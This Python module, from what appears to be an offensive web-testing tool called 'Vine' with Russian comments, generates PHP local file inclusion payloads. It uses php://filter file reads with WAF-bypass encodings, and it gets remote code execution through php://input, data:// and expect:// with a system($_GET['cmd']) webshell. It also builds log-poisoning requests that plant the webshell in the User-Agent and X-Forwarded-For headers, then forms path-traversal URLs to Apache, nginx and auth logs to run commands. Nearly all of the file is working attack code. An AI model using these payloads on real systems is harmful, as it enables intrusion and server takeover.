"""
Vine · core/wrappers.py
PHP Wrappers и Log Poisoning.

Классы атак:
  1. php://filter — чтение файлов в base64, обход некоторых WAF
  2. php://filter/convert — цепочки конвертации
  3. data:// — выполнение PHP-кода (нужен allow_url_include=On)
  4. expect:// — RCE через expect extension
  5. Log Poisoning — внедрение PHP через User-Agent в лог
"""

from __future__ import annotations

import base64
from dataclasses import dataclass, field


# ── Wrapper Payload ──────────────────────────────────────────────────────────

@dataclass(frozen=True)
class WrapperPayload:
    raw: str
    encoded: str
    target_file: str
    technique: str        # filter_b64 / filter_chain / data_rce / expect / log_poison
    wrapper_type: str     # php_filter / data / expect / log
    needs_decode: bool    # True если ответ в base64 и надо декодировать
    notes: str = ""       # подсказка что делать с результатом


# ── Генераторы ───────────────────────────────────────────────────────────────

def generate_wrapper_payloads(
    target_files: list[str],
    include_rce: bool = False,
) -> list[WrapperPayload]:
    """
    Генерирует PHP wrapper payloads.
    include_rce=True добавляет data:// и expect:// (нужен allow_url_include=On).
    """
    results: list[WrapperPayload] = []

    for tf in target_files:
        # ── 1. php://filter base64 ──────────────────────────────────────────
        # Самый распространённый — читает файл в base64, обходит фильтры на ../
        raw = f"php://filter/convert.base64-encode/resource={tf}"
        results.append(WrapperPayload(
            raw=raw, encoded=raw,
            target_file=tf,
            technique="filter_b64",
            wrapper_type="php_filter",
            needs_decode=True,
            notes="Ответ в base64 — Vine декодирует автоматически",
        ))

        # ── 2. php://filter rot13 ───────────────────────────────────────────
        raw2 = f"php://filter/read=string.rot13/resource={tf}"
        results.append(WrapperPayload(
            raw=raw2, encoded=raw2,
            target_file=tf,
            technique="filter_rot13",
            wrapper_type="php_filter",
            needs_decode=True,
            notes="Ответ в rot13 — Vine декодирует автоматически",
        ))

        # ── 3. php://filter двойное кодирование (WAF bypass) ────────────────
        # Некоторые WAF блокируют base64-encode, но не zlib.deflate
        raw3 = (
            f"php://filter/zlib.deflate/convert.base64-encode/resource={tf}"
        )
        results.append(WrapperPayload(
            raw=raw3, encoded=raw3,
            target_file=tf,
            technique="filter_deflate",
            wrapper_type="php_filter",
            needs_decode=True,
            notes="zlib+base64 — обходит некоторые WAF. Vine попробует декодировать.",
        ))

        # ── 4. php://filter без кодировки (чтение PHP-исходников) ───────────
        # Полезно для чтения .php файлов без выполнения
        if tf.endswith(".php") or not "." in tf.split("/")[-1]:
            raw4 = f"php://filter/resource={tf}"
            results.append(WrapperPayload(
                raw=raw4, encoded=raw4,
                target_file=tf,
                technique="filter_plain",
                wrapper_type="php_filter",
                needs_decode=False,
                notes="Чтение файла через filter без кодировки",
            ))

    # ── 5. php://input (POST body как файл) ─────────────────────────────────
    # Только для POST-режима
    results.append(WrapperPayload(
        raw="php://input",
        encoded="php://input",
        target_file="[stdin]",
        technique="input_rce",
        wrapper_type="php_input",
        needs_decode=False,
        notes="POST body выполняется как PHP. Тело запроса: <?php system('id'); ?>",
    ))

    if include_rce:
        # ── 6. data:// RCE ──────────────────────────────────────────────────
        php_code = "<?php system($_GET['cmd']); ?>"
        b64_code = base64.b64encode(php_code.encode()).decode()
        rce_payloads = [
            (f"data://text/plain,{php_code}",          "data_plain"),
            (f"data://text/plain;base64,{b64_code}",   "data_b64"),
            ("data:text/plain,<?php system('id'); ?>", "data_id"),
        ]
        for raw_rce, tech in rce_payloads:
            results.append(WrapperPayload(
                raw=raw_rce, encoded=raw_rce,
                target_file="[RCE]",
                technique=tech,
                wrapper_type="data",
                needs_decode=False,
                notes="⚠ Требует allow_url_include=On. Добавь ?cmd=id для RCE.",
            ))

        # ── 7. expect:// RCE ────────────────────────────────────────────────
        for cmd in ["id", "whoami", "uname -a"]:
            results.append(WrapperPayload(
                raw=f"expect://{cmd}",
                encoded=f"expect://{cmd}",
                target_file=f"[RCE:{cmd}]",
                technique="expect_rce",
                wrapper_type="expect",
                needs_decode=False,
                notes="⚠ Требует PHP expect extension (редко). Прямое выполнение команды.",
            ))

    return results


# ── Паттерны для wrapper-ответов ─────────────────────────────────────────────

WRAPPER_PATTERNS = {
    "filter_b64":     [],   # любой длинный base64 = успех
    "filter_rot13":   [],   # rot13 текст
    "filter_deflate": [],   # base64 сжатого
    "filter_plain":   ["<?php", "<?PHP", "function ", "class ", "require"],
    "input_rce":      ["uid=", "root", "www-data"],
    "data_plain":     ["uid=", "root", "www-data"],
    "data_b64":       ["uid=", "root", "www-data"],
    "data_id":        ["uid=", "root", "www-data"],
    "expect_rce":     ["uid=", "root", "www-data", "Linux"],
}

RCE_PATTERNS = ["uid=", "root", "www-data", "apache", "nginx", "Linux version"]


def get_wrapper_patterns(technique: str) -> list[str]:
    return WRAPPER_PATTERNS.get(technique, [])


def decode_wrapper_response(body: str, technique: str) -> str | None:
    """
    Пытается декодировать ответ wrapper-payload.
    Возвращает декодированный текст или None.
    """
    import re

    if technique == "filter_rot13":
        return _rot13(body.strip())

    if technique in ("filter_b64", "filter_deflate"):
        # Вытащить base64-строку из HTML
        # Ищем длинную строку из [A-Za-z0-9+/=]
        matches = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', body)
        for m in sorted(matches, key=len, reverse=True):
            try:
                decoded = base64.b64decode(m + "==").decode("utf-8", errors="replace")
                if len(decoded) > 10 and _looks_like_text(decoded):
                    if technique == "filter_deflate":
                        import zlib
                        try:
                            raw = base64.b64decode(m + "==")
                            decoded = zlib.decompress(raw, -15).decode("utf-8", errors="replace")
                        except Exception:
                            pass
                    return decoded
            except Exception:
                continue
    return None


def _rot13(s: str) -> str:
    result = []
    for c in s:
        if 'a' <= c <= 'z':
            result.append(chr((ord(c) - ord('a') + 13) % 26 + ord('a')))
        elif 'A' <= c <= 'Z':
            result.append(chr((ord(c) - ord('A') + 13) % 26 + ord('A')))
        else:
            result.append(c)
    return ''.join(result)


def _looks_like_text(s: str) -> bool:
    """Эвристика: строка похожа на читаемый текст."""
    if len(s) < 5:
        return False
    printable = sum(1 for c in s if c.isprintable() or c in '\n\r\t')
    return printable / len(s) > 0.8


# ── Log Poisoning ────────────────────────────────────────────────────────────

@dataclass
class LogPoisonResult:
    log_path: str
    log_url: str           # URL который читает лог
    rce_confirmed: bool
    command_output: str
    payload_used: str
    webshell_url: str      # URL для последующих команд


LOG_PATHS_LINUX = [
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "/var/log/auth.log",
    "/proc/self/environ",
    "/var/mail/www-data",
    "/var/spool/mail/www-data",
]

PHP_WEBSHELL = "<?php system($_GET['cmd']); ?>"
PHP_TEST_CMD = "id"


def build_poison_request_headers(cmd: str = PHP_TEST_CMD) -> dict:
    """Заголовки для отравления лога — PHP-код в User-Agent."""
    shell = PHP_WEBSHELL
    return {
        "User-Agent": shell,
        "X-Forwarded-For": shell,   # на случай если логируется этот заголовок
    }


def build_rce_url(lfi_url: str, param: str, log_path: str, cmd: str) -> str:
    """Собирает URL для выполнения команды через log poisoning."""
    import urllib.parse
    parsed = urllib.parse.urlparse(lfi_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    # Путь до лога через traversal
    qs[param] = [f"../../../../..{log_path}"]
    qs["cmd"] = [cmd]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


WRAPPER_TECHNIQUE_LABELS = {
    "filter_b64":     "php://filter base64",
    "filter_rot13":   "php://filter rot13",
    "filter_deflate": "php://filter zlib+base64",
    "filter_plain":   "php://filter plain",
    "input_rce":      "php://input RCE",
    "data_plain":     "data:// plain RCE",
    "data_b64":       "data:// base64 RCE",
    "data_id":        "data:// id check",
    "expect_rce":     "expect:// RCE",
    "log_poison":     "Log Poisoning → RCE",
}
